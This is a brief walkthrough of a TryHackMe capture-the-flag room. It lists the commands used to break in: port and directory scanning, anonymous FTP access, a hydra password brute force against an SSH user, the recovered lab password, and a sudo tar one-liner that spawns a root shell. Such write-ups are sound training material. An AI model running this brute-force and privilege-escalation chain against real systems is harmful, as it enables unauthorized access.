# Bounty Hunter

**Room Link:** [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker)



## Scanning

### Initial Scan

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

<pre><code><strong>nmap -p- $VICTIM
</strong></code></pre>

### TCP/80 - HTTP

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt 
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### TCP/22 - SSH&#x20;

anonymous login works

**Kali**

```
ftp $VICTIM
Username: anonymous
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l lin -P locks.txt ssh://$VICTIM
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```
Username: lin
Password: RedDr4gonSynd1cat3
```

**Kali**

```
ssh lin@$VICTIM
```

## Privlege Escalation&#x20;

**Exploit Link:** [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)

**Victim**

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>







